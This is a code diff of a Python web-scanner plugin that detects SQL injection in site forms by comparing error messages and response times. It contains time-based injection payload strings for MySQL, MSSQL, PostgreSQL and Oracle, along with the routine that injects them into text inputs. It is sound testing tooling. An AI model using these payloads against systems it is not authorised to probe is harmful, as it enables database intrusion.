@@ -5,19 +5,34 @@ from bs4 import BeautifulSoup
 import time
 import random
 
+# ----------------- {Consts} ---------------------
 COLOR = COLOR_MANAGER.rgb(255, 0, 128)
 TIME = 10
 MINIMUM_ATTEMPTS = 3
-comments = {"#": [f"sleep({TIME})"],
-            "-- ": [f"sleep({TIME})"],
-            "--": [f"dbms_pipe.receive_message(('a'),{TIME})",
-                   f"WAITFOR DELAY '0:0:{TIME}'", f"pg_sleep({TIME})"]}
-CHECK_STRING = "check"
+MAXIMUM_ATTEMPTS = 3
+ERROR_WORDS = ["error", "fail"]
+QUERY_WORDS = ["sleep", "limit"]
+
+# ----------------------- {Global variables} ------------------------------
+comments = {"#": [f"sleep({Methods.WAITING_TIME})"],
+            "-- ": [f"sleep({Methods.WAITING_TIME})"],
+            "--": [f"dbms_pipe.receive_message(('a'),{Methods.WAITING_TIME})",
+                   f"WAITFOR DELAY '0:0:{Methods.WAITING_TIME}'", f"pg_sleep({Methods.WAITING_TIME})"]}
+query = str()
+non_blind_problem = Classes.CheckResult("", "", "The plugin submits the action forms and check for 'error' or 'fail'"
+                                                " words in the resulted page, it might indicate false positives,"
+                                                " it made for sleep function blocking.\n"
+                                                "You can check yourself if these are just irrelevant error messages.")
+blind_problem = Classes.CheckResult("", "", "The plugin uses the sleep function of SQL "
+                                            "to slow down the server's response.\n"
+                                            "Compares between the response time and if the difference"
+                                            " is close to 10 seconds, it must indicate SQL injection vulnerability.")
 
 
-def check(data: Data.Data):
+def check(data):
     """
     Function checks the website for SQL injection
+    @type data: Classes.Data
     @param data: The data object of the program
     @return: None
     """
@@ -46,22 +61,40 @@ def check(data: Data.Data):
             else:
                 # The user did not specified his agreement
                 # and there is a vulnerable page
-                sqli_results.page_results = "The plugin check routine requires injecting text boxes," \
+                sqli_results.warning = "The plugin check routine requires injecting text boxes," \
                                             " read about (-A) in our manual and try again."
-    except Exception:
-        sqli_results.page_results = "Something went wrong..."
+                break
+            for form in forms:
+                try:
+                    sql_injection(page, form, data)
+                except Exception:
+                    continue
+    except Exception as e:
+        sqli_results.error = "Something went wrong..."
 
+    non_blind_problem.problem = "These text inputs *may* have allowed SQL injection," \
+                                " the plugin has detected an error message that " \
+                                f"may indicate about a SQL vulnerability,\n" \
+                                f"while using the query '{query}'."
+    sqli_results.results.append(non_blind_problem)
+    blind_problem.problem = "These text inputs allowed blind SQL injection, " \
+                            f"the query '{query}' has slowed down the server's response."
+    sqli_results.results.append(blind_problem)
+    sqli_results.conclusion = f"You can validate the input from the " \
+                              f"vulnerable parameters, by checking for " \
+                              f"vulnerable characters or wrong input type."
     data.mutex.acquire()
-    data.results.append(sqli_results)  # Adding the results to the data object
+    data.results_queue.put(sqli_results)  # Adding the results to the queue
     data.mutex.release()
 
 
-def filter_forms(pages: list, aggressive: bool) -> list:
+def filter_forms(page):
     """
     Function filters the pages that has an action form
-    @param pages:List of pages
-    @param aggressive: If it's false the user did not specified his agreement
-    @return: List of pages that has an action form
+    @type page: Classes.Page
+    @param page: The current page
+    @rtype: list
+    @return: List of forms
     """
     filtered_pages = list()
     for page in pages:
@@ -110,54 +143,40 @@ def filter_forms(pages: list, aggressive: bool) -> list:
     return filtered_pages
 
 
-def sql_injection(page, form: dict, data: Data.Data) -> Data.PageResult:
+def sql_injection(page, form, data):
     """
     Function checks the page for SQL injection
+    @type page: Classes.Page
     @param page: The current page
+    @type form: dict
     @param form: The page's action form
+    @type data: Classes.Data
     @param data: The data object of the program
-    @return: Page result object
+    @return: None
     """
-    page_result = Data.PageResult(page, "", "")
+    page_result = Classes.PageResult(page, f"Action form '{form['action']}': ")
     global comments
-    text_inputs = get_text_inputs(form)  # Getting the text inputs
-    results = dict()
-    for text_input in text_inputs:
-        # Setting keys for the results
-        results[text_input["name"]] = 0
-    found_vulnerability = False
+    global query
+    text_inputs = Methods.get_text_inputs(form["inputs"])  # Getting the text inputs
+    words_count = dict()
+    for key in ERROR_WORDS:
+        words_count[key] = 0
+    for key in QUERY_WORDS:
+        words_count[key] = 0
+    input_in_dom = False
     normal_time = 0
     normal_attempts = 0
 
-    def inject(string=None) -> (str, float):
-        """
-        Inner function inject a string into a text box and submit the form
-        @param string: The string we want to inject
-        @return: Set of (the content of the page, the time it took submit the form)
-        """
-        browser = None
-        try:
-            browser = set_browser(data, page)
-            if not string:
-                # If there is no string specified, generate a random string
-                string = get_random_str(browser.page_source)
-            elif "X" in string:
-                # Replace X with a random string
-                string = string.replace("X", get_random_str(browser.page_source))
-            c, r = submit_form([dict(input_tag) for input_tag in form["inputs"]],
-                               text_inputs[0], string, data, browser)
-        except Exception:
-            # In case of failing, try again
-            if browser:
-                browser.quit()
-            return inject(string)
-        else:
-            browser.quit()
-            return c, r
-
     for _ in range(MINIMUM_ATTEMPTS):
         # Injecting
-        content, run_time = inject()
+        temp_form = Methods.fill_input(form, dict(), "")
+        fill_temp_form(temp_form)
+        content, run_time, string = Methods.inject(data, page, temp_form)
+        if string in content:
+            input_in_dom = True  # If the form prints the input to the dom
+        for key in words_count.keys():
+            if content.lower().count(key) > words_count[key]:
+                words_count[key] = content.lower().count(key)
         normal_time += run_time
         normal_attempts += 1
 
@@ -165,66 +184,68 @@ def sql_injection(page, form: dict, data: Data.Data) -> Data.PageResult:
         # Checking every comment
         for sleep in comments[comment]:
             # Checking every sleep function
-            content, run_time = inject(f"X' OR NOT {sleep} LIMIT 1{comment}")
+            query = f"{Methods.CHANGING_SIGN}'" \
+                    f" OR NOT {sleep} LIMIT 1{comment}"
+            temp_form = Methods.fill_input(form, text_inputs[0], query)
+            fill_temp_form(temp_form)
+            content, run_time, string = Methods.inject(data, page, temp_form)
             injection_time = run_time  # Injected input run time
             injection_attempts = 1
+            for key in ERROR_WORDS:
+                if content.lower().count(key) > words_count[key]:
+                    # If there is a error word key in the content
+                    found = False
+                    if input_in_dom and query not in content:
+                        # Normal input printed to the screen, sleep query did not
+                        found = True
+                    elif string not in content and \
+                            any(content.lower().count(word) > words_count[word] for word in QUERY_WORDS):
+                        # The check string was not printed, but the query words were printed.
+                        found = True
+                    if found:
+                        # The screen printed an error message
+                        page_result.description += f"The text parameter '{text_inputs[0]['name']}'."
+                        non_blind_problem.add_page_result(page_result, "\n")
+                        comments = {comment: [sleep]}  # Found the data base's sleep function and comment
+                        return
             while True:
                 difference = injection_time/injection_attempts - normal_time/normal_attempts
                 if difference < TIME + 2:
                     # It did not took too much time
                     if difference > TIME - 2:
                         # The injection slowed down the server response
-                        results[text_inputs[0]["name"]] = difference
+                        page_result.description += f"The text parameter '{text_inputs[0]['name']}'" \
+                                                    " slowed down the server by %3.1f seconds." % difference
+                        blind_problem.add_page_result(page_result, "\n")
                         comments = {comment: [sleep]}  # Found the data base's sleep function and comment
-                        found_vulnerability = True
-                        break
+                        return
                     if difference < 2:
                         break
-                # It took too much time to load the page
-                content, run_time = inject()
+                elif injection_attempts == MAXIMUM_ATTEMPTS:
+                    # It took too much time to load the page
+                    page_result.description += f"The text parameter '{text_inputs[0]['name']}'" \
+                                               " slowed down the server by %3.1f seconds." % difference
+                    blind_problem.add_page_result(page_result, "\n")
+                    comments = {comment: [sleep]}  # Found the data base's sleep function and comment
+                    return
+                # Between 2-8 seconds we need to make sure
+                temp_form = Methods.fill_input(form, dict(), "")
+                fill_temp_form(temp_form)
+                content, run_time, string = Methods.inject(data, page, temp_form)
                 normal_time += run_time
                 normal_attempts += 1
-
-                content, run_time = inject(f"X' OR NOT {sleep} LIMIT 1{comment}")
+                temp_form = Methods.fill_input(form, text_inputs[0], query)
+                fill_temp_form(temp_form)
+                content, run_time, string = Methods.inject(data, page, temp_form)
                 injection_time += run_time  # Injected input run time
                 injection_attempts += 1
-            if found_vulnerability:
-                # If a vulnerability is found, There is no reason to check another comment
-                break
-        if found_vulnerability:
-            # If a vulnerability is found, There is no reason to check another comment
-            break
-    write_vulnerability(results, page_result)
-    return page_result
 
 
-def set_browser(data: Data.Data, page):
+def fill_temp_form(form):
     """
-    Function Sets up a new browser, sets its cookies and checks if the cookies are valid
-    @param data: The data object of the program
-    @param page: The current page
-    @return: The browser object
-    """
-    browser = data.new_browser()  # Getting new browser
-    browser.request_interceptor = interceptor  # Setting request interceptor
-    browser.set_page_load_timeout(60)  # Setting long timeout
-    if type(page) is Data.SessionPage:
-        url = page.url
-        if page.parent:
-            # If the page is not first
-            url = page.parent.url
-        browser.get(url)  # Getting parent URL
-        for cookie in page.cookies:  # Adding cookies
-            browser.add_cookie(cookie)
-    # Getting the page again, with the cookies
-    browser.get(page.url)
-    return browser
-
-
-def interceptor(request):
-    """
-    Function acts like proxy, it changes the requests header
-    @param request: The current request
+    Function fill the temp form text inputs with the CHANGING_SIGN
+    @type form: dict
+    @param form: The temp form
     @return: None
     """
     # Block PNG, JPEG and GIF images
@@ -241,67 +262,8 @@ def get_text_inputs(form) -> list:
     """
     text_inputs = list()
     for input_tag in form["inputs"]:
-        # Using the specified value
-        if "name" in input_tag.keys():
-            # Only if the input has a name
-            if input_tag["type"] and input_tag["type"] == "text":
-                text_inputs.append(input_tag)
-    return text_inputs
-
-
-def get_random_str(content: str) -> str:
-    """
-    Function generates a random string which is not in the current page
-    @param content: The content of the current page
-    @return: random string
-    """
-    while True:
-        string = CHECK_STRING + str(random.randint(0, 1000))
-        if string not in content:
-            return string
-
-
-def submit_form(inputs: list, curr_text_input: dict,
-                text: str, data: Data.Data, browser) -> (str, float):
-    """
-    Function submits a specified form
-    @param inputs: A list of inputs of action form
-    @param curr_text_input: The current text input we are checking
-    @param text: The we want to implicate into the current text input
-    @param data: The data object of the program
-    @param browser: The webdriver object
-    @return: The content of the resulted page
-    """
-    # The arguments body we want to submit
-    for input_tag in inputs:
-        # Using the specified value
-        if not input_tag["value"]:
-            if "name" in input_tag.keys() and input_tag["name"] == curr_text_input["name"]:
-                # Only if the input has the current name
-                input_tag["value"] = text
-            else:
-                input_tag["value"] = get_random_str(browser.page_source)
-    # Sending the request
-    start = time.time()  # Getting time of normal input
-    data.submit_form(inputs, browser)
-    run_time = time.time() - start
-    content = browser.page_source
-    return content, run_time
-
-
-def write_vulnerability(results: dict, page_result: Data.PageResult):
-    """
-    Function writes the problem and the solution of every problem that is found for a page
-    @param results: a dictionary of text input and list of chars it didn't filter
-    @param page_result: page result object of the current page
-    @return: None
-    """
-    for key in results.keys():
-        # For every text input
-        if results[key]:
-            # If the input is vulnerable
-            page_result.problem = f"The text parameter '{key}' allowed blind SQL injection," \
-                                  " the server has slowed down by %3.1f seconds." % results[key]
-            page_result.solution = f"You can validate the input from the " \
-                                   f"'{key}' parameter, by checking for " \
-                                   f"vulnerable characters or wrong input type"
+        if input_tag in Methods.get_text_inputs(form["inputs"]):
+            # If it is a text input
+            if "value" in input_tag.keys() and not input_tag["value"]:
+                # There is no value to the text input
+                input_tag["value"] = Methods.CHANGING_SIGN
